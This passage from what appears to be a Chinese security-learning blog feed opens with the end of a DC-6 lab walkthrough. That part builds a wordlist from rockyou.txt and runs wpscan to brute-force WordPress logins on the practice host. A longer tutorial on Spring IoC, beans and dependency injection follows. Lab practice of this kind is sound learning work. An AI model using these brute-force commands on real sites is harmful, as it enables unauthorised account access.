<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">gzip</span> <span class="selector-tag">-d</span> <span class="selector-tag">rockyou</span><span class="selector-class">.txt</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209202612.png" alt></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> rockyou.txt | <span class="keyword">grep</span> k01&gt;k01.txt</span><br></pre></td></tr></table></figure>

<p>将里面的k01的部分导出到dc6目录下面的passwords.txt</p>
<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209202622.png" alt></p>
<p>接着使用wpscan的暴力破解命令：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -u -p passwords.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209203905.png" alt></p>
<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209204033.png" alt></p>
<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209204455.png" alt></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>DC-6靶机学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全--Spring框架基础学习</title>
    <url>/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/</url>
    <content><![CDATA[<h2 id="Spring框架基础学习"><a href="#Spring框架基础学习" class="headerlink" title="Spring框架基础学习"></a>Spring框架基础学习</h2><h3 id="Spring–IOC"><a href="#Spring–IOC" class="headerlink" title="Spring–IOC"></a>Spring–IOC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>spring的核心思想是IOC和AOP，IoC - Inversion of Control, 控制反转，通俗点说就是把创建和管理bean的过程转移给了第三方。而这个第三方就是我们说的IOC容器。</p>
<p>Spring容器将创建对象,把它们连接在一起,配置它们,并管理他们的整个生命周期从创建到销毁。控制着bean的依赖注入。</p>
<p><strong>那么这里为什么要叫做控制反转呢?</strong></p>
<p>我们先来对比下两种不同的获取外部对象的资源的方法。</p>
<ul>
<li>主动去创建相关对象然后再组合。</li>
</ul>
<p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/261421378318292.jpg" alt="img"></p>
<ul>
<li>IOC/DI容器中</li>
</ul>
<p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/img.png" alt="img"></p>
<p>在 Spring 中，类的实例化、依赖的实例化、依赖的传入都交由 Spring Bean 容器控制，而不是用<code>new</code>方式实例化对象、通过非构造函数方法传入依赖等常规方式。<strong>实质的控制权已经交由程序管理，而不是程序员管理，所以叫做控制反转。</strong></p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>有一个<code>Book</code>类：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name ;     <span class="comment">//书名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> money;        /价格  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">(<span class="keyword">String</span> name, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Person</code>类依赖于<code>Book</code>类，</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Book book;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Person(Book book) &#123;</span><br><span class="line">        <span class="keyword">this</span>.book = book;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    因为IoC容器要负责实例化所有的组件，因此，有必要告诉容器如何创建组件，以及各组件的依赖关系。一种最简单的配置是通过XML文件来实现，例如：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;beans&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"dataSource"</span> <span class="keyword">class</span>="<span class="symbol">HikariDataSource</span>" /&gt;</span><br><span class="line">    &lt;<span class="symbol">bean</span> <span class="symbol">id</span>="<span class="symbol">bookService</span>" <span class="symbol">class</span>="<span class="symbol">BookService</span>"&gt;</span><br><span class="line">        &lt;<span class="symbol">property</span> <span class="symbol">name</span>="<span class="symbol">dataSource</span>" <span class="symbol">ref</span>="<span class="symbol">dataSource</span>" /&gt;</span><br><span class="line">    &lt;/<span class="symbol">bean</span>&gt;</span><br><span class="line">    &lt;<span class="symbol">bean</span> <span class="symbol">id</span>="<span class="symbol">userService</span>" <span class="symbol">class</span>="<span class="symbol">UserService</span>"&gt;</span><br><span class="line">        &lt;<span class="symbol">property</span> <span class="symbol">name</span>="<span class="symbol">dataSource</span>" <span class="symbol">ref</span>="<span class="symbol">dataSource</span>" /&gt;</span><br><span class="line">    &lt;/<span class="symbol">bean</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">beans</span>&gt;</span><br></pre></td></tr></table></figure>

<p>​    上述XML配置文件指示IoC容器创建3个JavaBean组件，并把id为<code>dataSource</code>的组件通过属性<code>dataSource</code>（即调用<code>setDataSource()</code>方法）注入到另外两个组件中。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean,控制反转通过依赖注入(DI)方式实现对象之间的松耦合关系。</p>
<h3 id="Spring–Bean"><a href="#Spring–Bean" class="headerlink" title="Spring–Bean"></a>Spring–Bean</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​    spring官方文档对bean的解释是:在spring中,构成应用程序主干并由Spring IoC容器管理的对象称为bean。bea是一个由Spring IoC容器实例化、组装和管理的对象。</p>
<p>bean主要包含以下几个概念:</p>
<ul>
<li>Bean容器，或称spring ioc容器，主要用来管理对象和依赖，以及依赖的注入。</li>
<li>bean是一个java对象,根据bean规范编写出来的类,并由bean容器生成的对象就是一个bean。</li>
<li>bean规范</li>
</ul>
<p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/ioc-bean.png" alt="img"></p>
<h4 id="Bean实例化"><a href="#Bean实例化" class="headerlink" title="Bean实例化"></a>Bean实例化</h4><h5 id="1-普通构造方法创建"><a href="#1-普通构造方法创建" class="headerlink" title="1.普通构造方法创建"></a>1.普通构造方法创建</h5><p>使用比较多的一种创建方式，可以直接配置bean节点,例如:</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在xml中简单配置一个bean节点，如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;bean <span class="attribute">class</span>=<span class="string">"org.test.Demo"</span> <span class="attribute">id</span>=<span class="string">"test"</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>通过以下代码进行简单的测试：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> <span class="constructor">ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>)</span>;</span><br><span class="line">        Demo test = (Demo) context.get<span class="constructor">Bean(<span class="string">"test"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(test);</span><br></pre></td></tr></table></figure>

<h5 id="2-静态工厂创建"><a href="#2-静态工厂创建" class="headerlink" title="2.静态工厂创建"></a>2.静态工厂创建</h5><p>通过静态构造方法来创建一个bean的实例，如下：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add2()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个静态工厂，如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2Factory</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Demo2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该工厂中有一个静态方法，该静态方法返回一个的实例，通过Spring的配置文件生成Demo2的实例：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;bean <span class="attribute">id</span>=<span class="string">"demo2"</span> <span class="attribute">class</span>=<span class="string">"org.test.demo2Factory"</span> <span class="attribute">factory-method</span>=<span class="string">"getInstance"</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>factory-method属性，该属性指明该类中的静态工厂方法名为getInstance，spring框架根据属性来调用方法来获取Demo2的实例了，测试代码如下：</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">        Demo2 demo = (Demo2) context.getBean(<span class="string">"demo2"</span>);</span><br><span class="line">        demo.add();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="实例工厂创建"><a href="#实例工厂创建" class="headerlink" title="实例工厂创建"></a>实例工厂创建</h5><p>通过实例工厂来创建bean实例，例如:</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add3()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时有一个工厂方法，如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3Factory</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Demo3 <span class="title">getDemo3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Demo3Factory类中有一个getDemo3的方法，该方法返回一个Demo3类的实例,Spring的配置文件如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;bean <span class="attribute">class</span>=<span class="string">"org.test.Demo3Factory"</span> <span class="attribute">id</span>=<span class="string">"demo3Factory"</span>/&gt;</span><br><span class="line">    &lt;bean <span class="attribute">id</span>=<span class="string">"demo3"</span> <span class="attribute">factory-bean</span>=<span class="string">"demo3Factory"</span> <span class="attribute">factory-method</span>=<span class="string">"getDemo3"</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>第一个bean用来获取demo3Factory的实例，第二个bean则根据demo3Factory的实例，然后指定factory-method，通过getDemo3方法来获取Demo3的实例。<br>测试代码如下：</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">    Demo3 demo = (Demo3) context.getBean(<span class="string">"demo3"</span>);</span><br><span class="line">    demo.add();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Bean作用域"><a href="#Bean作用域" class="headerlink" title="Bean作用域"></a>Bean作用域</h4><p>spring bean 一共有五种作用域。</p>
<h5 id="1-Singleton-（缺省作用域、单例类型）"><a href="#1-Singleton-（缺省作用域、单例类型）" class="headerlink" title="1.Singleton （缺省作用域、单例类型）"></a>1.Singleton （缺省作用域、单例类型）</h5><p>​    容器中只存在一个共享的Bean，只要id与Bean定义相匹配，那就会是同一个Bean。在容器启动（实例化）时Bean就实例化和初始化（可以通过lazy-init=”true”来设置使得Bean被调用时才初始化）。</p>
<h5 id="2-Prototype-（原型类型）"><a href="#2-Prototype-（原型类型）" class="headerlink" title="2.Prototype （原型类型）"></a>2.Prototype （原型类型）</h5><p>​    对有状态的Bean建议使用Prototype，对无状态建议使用Singleton。<br>容器启动时并没有实例化Bean，只有获取Bean时才会被创建，并且每一次都是新建一个对象。</p>
<h5 id="3-request（web的Spring-ApplicationContext）"><a href="#3-request（web的Spring-ApplicationContext）" class="headerlink" title="3.request（web的Spring ApplicationContext）"></a>3.request（web的Spring ApplicationContext）</h5><p>​    每个HTTP 都会有自己的Bean，当处理结束时，Bean销毁。</p>
<h5 id="4-session（web的Spring-ApplicationContext）"><a href="#4-session（web的Spring-ApplicationContext）" class="headerlink" title="4.session（web的Spring ApplicationContext）"></a>4.session（web的Spring ApplicationContext）</h5><p>​    每一个Http session有自己的Bean</p>
<h5 id="5-global-session（web的Spring-ApplicationContext）"><a href="#5-global-session（web的Spring-ApplicationContext）" class="headerlink" title="5.global session（web的Spring ApplicationContext）"></a>5.global session（web的Spring ApplicationContext）</h5><p>​        global session作用域类似于标准的HTTP Session作用域，不过仅仅在基于portlet的web应用中才有意义。Portlet规范定义了全局Session的概念，它被所有构成某个portlet web应用的各种不同的portlet所共享。在global session作用域中定义的bean被限定于全局portlet Session的生命周期范围内。</p>
<h4 id="Bean生命周期"><a href="#Bean生命周期" class="headerlink" title="Bean生命周期"></a>Bean生命周期</h4><p>　　Spring Bean的完整生命周期从创建Spring容器开始，直到最终Spring容器销毁Bean，这其中包含了一系列关键点。</p>
<p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/181453414212067.png" alt="img"></p>
<p><img src="/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/181454040628981.png" alt="img"></p>
<h5 id="单例管理的对象"><a href="#单例管理的对象" class="headerlink" title="单例管理的对象"></a>单例管理的对象</h5><p>Bean在容器启动时就会实例化和初始化，但是可以通过Bean的设置来设置对象的初始化时机<br>第一种：通过设置<bean></bean></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;bean <span class="attribute">id</span>=<span class="string">"ServiceImpl"</span> <span class="attribute">class</span>=<span class="string">"cn.csdn.service.ServiceImpl"</span> <span class="attribute">lazy-init</span>=<span class="string">"true"</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>第二种：通过设置<Beans>来修改所有bean默认方式的初始化时机</Beans></p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">&lt;beans <span class="keyword">default</span>-<span class="built_in">lazy</span>-<span class="keyword">init</span>=<span class="string">"true"</span>&gt;</span><br></pre></td></tr></table></figure>

<h5 id="非单例管理的对象"><a href="#非单例管理的对象" class="headerlink" title="非单例管理的对象"></a>非单例管理的对象</h5><p>Spring读取xml文件的时候，并不会立刻创建对象，而是在第一次请求该bean时才初始化（如调用getBean方法时）。<strong>容器只会实例化和初始化Bean，不会销毁Bean。清除prototype作用域的对象并释放任何prototype bean所持有的昂贵资源，都是客户端代码的职责。</strong>在初始化后交由调用者管理</p>
<h3 id="Spring–依赖注入-DI"><a href="#Spring–依赖注入-DI" class="headerlink" title="Spring–依赖注入(DI)"></a>Spring–依赖注入(DI)</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>依赖注入(Dependency Injection，DI)，和控制反转含义相同，<strong>它们是从两个角度描述的同一个概念。</strong></p>
<p>​    当某个java实例(调用者)需要另一个java实例(被调用者)，我们通常采用的方法是由调用者来创建被调用者的实例。（使用new关键字获得被调用者的实例)。</p>
<p>​    在spring中，spring在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，调用者通过spring容器获得被调用者实例，被称为依赖注入。</p>
<h4 id="注入方式-bean装配"><a href="#注入方式-bean装配" class="headerlink" title="注入方式(bean装配)"></a>注入方式(bean装配)</h4><p>​    依赖注入的本质就是装配，装配是依赖注入的具体行为。在Spring中，注入依赖对象可以采用手工装配或自动装配。</p>
<p><strong>手工装配一般分为两种方式</strong>：</p>
<ul>
<li><p>一种是在XML文件中，通过在bean节点下配置；比如使用属性的setter方法注入依赖对象或者使用构造方法注入。</p>
</li>
<li><p>一种就是在java代码中使用注解的方式进行装配，在代码中加入@Resource或者@Autowired。</p>
</li>
</ul>
<h5 id="setter方法注入"><a href="#setter方法注入" class="headerlink" title="setter方法注入"></a>setter方法注入</h5><p>​    由于setter注入方式具有可选择性和灵活性高的特点，因此它也是实际开发中最常用的注入方式。setter方法更加直观，我们来看一下spring的配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用spring管理对象的创建，还有对象的依赖关系 --&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Mysql"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4MysqlImpl"</span>/&gt;</span>     </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Oracle"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4OracleImpl"</span>/&gt;</span>          </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userManager"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.manager.UserManagerImpl"</span>&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (1)userManager使用了userDao，Ioc是自动创建相应的UserDao实现，都是由容器管理--&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (2)在UserManager中提供构造函数，让spring将UserDao实现注入（DI）过来 --&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (3)让spring管理我们对象的创建和依赖关系，必须将依赖关系配置到spring的核心配置文件中 --&gt;</span>    </span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"userDao"</span> <span class="attr">ref</span>=<span class="string">"userDao4Oracle"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着我们来看一下，setter表示依赖关系的写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tgb.spring.dao.UserDao;    </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserManagerImpl</span> <span class="keyword">implements</span> <span class="title">UserManager</span></span>&#123;     </span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;    </span><br><span class="line">    <span class="comment">//使用设值方式赋值    </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;    </span><br><span class="line">    &#125;          </span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String userName, String password)</span> </span>&#123;      </span><br><span class="line">        userDao.addUser(userName, password);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="构造函数注入"><a href="#构造函数注入" class="headerlink" title="构造函数注入"></a>构造函数注入</h5><p>​    构造函数注入是除setter注入之外的另一种常用的注入方式，它可以保证一些必要的属性在bean实例化时就得到了设置，并在实例化后就可以使用。</p>
<p>使用构造函数注入的前提是： bean必须提供带参的构造函数。</p>
<p>对于构造函数的注入，配置文件可以有以下几种方式：</p>
<ul>
<li>按类型匹配入参</li>
<li>按索引匹配入参</li>
<li>联合使用类型和索引匹配入参</li>
<li>通过自身类型反射匹配入参</li>
</ul>
<p>我们看一下spring的配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用spring管理对象的创建，还有对象的依赖关系 --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Mysql"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4MysqlImpl"</span>/&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Oracle"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4OracleImpl"</span>/&gt;</span>         </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userManager"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.manager.UserManagerImpl"</span>&gt;</span>    </span><br><span class="line">        <span class="comment">&lt;!-- (1)userManager使用了userDao，Ioc是自动创建相应的UserDao实现，都是由容器管理--&gt;</span>   </span><br><span class="line">        <span class="comment">&lt;!-- (2)在UserManager中提供构造函数，让spring将UserDao实现注入（DI）过来 --&gt;</span>    </span><br><span class="line">        <span class="comment">&lt;!-- (3)让spring管理我们对象的创建和依赖关系，必须将依赖关系配置到spring的核心配置文件中 --&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"userDao4Oracle"</span>/&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们再来看一下，构造器表示依赖关系的写法，代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tgb.spring.dao.UserDao;    </span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserManagerImpl</span> <span class="keyword">implements</span> <span class="title">UserManager</span></span>&#123;   </span><br><span class="line">        <span class="keyword">private</span> UserDao userDao;    </span><br><span class="line">        <span class="comment">//使用构造方式赋值    </span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UserManagerImpl</span><span class="params">(UserDao userDao)</span> </span>&#123;    </span><br><span class="line">            <span class="keyword">this</span>.userDao = userDao;    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="meta">@Override</span>    </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String userName, String password)</span> </span>&#123;         </span><br><span class="line">            userDao.addUser(userName, password);    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>基于注解</strong></p>
<p>​    使用注解注入依赖对象不用再在代码中写依赖对象的setter方法或者该类的构造方法，并且不用再配置文件中配置大量的依赖对象，使代码更加简洁，清晰，易于维护。</p>
<p>在Spring IOC编程的实际开发中推荐使用注解的方式进行依赖注入。</p>
<ul>
<li>Autowired是自动注入，自动从spring的上下文找到合适的bean来注入</li>
<li>Resource用来指定名称注入</li>
<li>Qualifier和Autowired配合使用，指定bean的名称，如</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Autowired  </span><br><span class="line">@Qualifier(&quot;userDAO&quot;)  </span><br><span class="line">private UserDAO userDAO;</span><br></pre></td></tr></table></figure>

<p>Spring容器的配置文件applicationContext.Xml文件中配置以下信息,是一个Spring配置文件的模板：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>   </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans   </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/beans/spring-beans-2.5.xsd  </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/context   </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/context/spring-context-2.5.xsd  </span></span></span><br><span class="line"><span class="tag"><span class="string">"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Spring配置隐式的注册了多个对注释进行解析的处理器,例如：</p>
<ul>
<li>AutowiredAnnotationBeanPostProcessor</li>
<li>CommonAnnotationBeanPostProcessor</li>
<li>PersistenceAnnotationBeanPostProcessor</li>
</ul>
<p>在配置文件中打开<a href="context:annotation-config">context:annotation-config</a>节点，告诉Spring容器可以用注解的方式注入依赖对象；其在配置文件中的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;beans&gt;&lt;context:annotation-config&gt;&lt;&#x2F;context:annotation-config&gt;&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>

<p>在配置文件中配置bean对象，如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"com.springtest.dao.impl.UserDAOImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userBiz"</span> <span class="attr">class</span>=<span class="string">"com.springtest.biz.impl.UserBizImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后，在需要依赖注入的类中，声明一个依赖对象，不用生成该依赖对象的setter方法，并且为该对象添加注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserBizImpl</span> <span class="keyword">implements</span> <span class="title">UserBiz</span> </span>&#123;  </span><br><span class="line">   <span class="meta">@Resource</span>(name=<span class="string">"userDao"</span>)  </span><br><span class="line">   <span class="keyword">private</span> UserDAO userDao = <span class="keyword">null</span>; </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">          <span class="keyword">this</span>.userDao.addUser();  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>@Autowired默认按类型装配，@Resource默认按名称装配，当找不到与名称匹配的bean时，才会按类型装配。</p>
<h4 id="控制反转与依赖注入的区别"><a href="#控制反转与依赖注入的区别" class="headerlink" title="控制反转与依赖注入的区别"></a>控制反转与依赖注入的区别</h4><p>依赖注入和控制反转是对同一件事情的不同描述，</p>
<ul>
<li><p>依赖注入是从应用程序的角度在描述：应用程序依赖容器创建并注入它所需要的外部资源;</p>
</li>
<li><p>控制反转是从容器的角度在描述:容器控制应用程序，由容器反向的向应用程序注入应用程序所需要的外部资源。</p>
</li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://juejin.cn/post/6844903813753602056" target="_blank" rel="noopener">Spring注入Bean的几种方式 (juejin.cn)</a></p>
<p><a href="https://www.yisu.com/zixun/207582.html" target="_blank" rel="noopener">详解Spring中bean的几种注入方式 - 编程语言 - 亿速云 (yisu.com)</a></p>
<p><a href="https://www.w3cschool.cn/wkspring" target="_blank" rel="noopener">https://www.w3cschool.cn/wkspring</a></p>
<p><a href="https://blog.csdn.net/zhangzeyuaaa/article/details/22588459" target="_blank" rel="noopener">(15条消息) Spring Bean自动装配和注解注入_似水流年-CSDN博客</a></p>
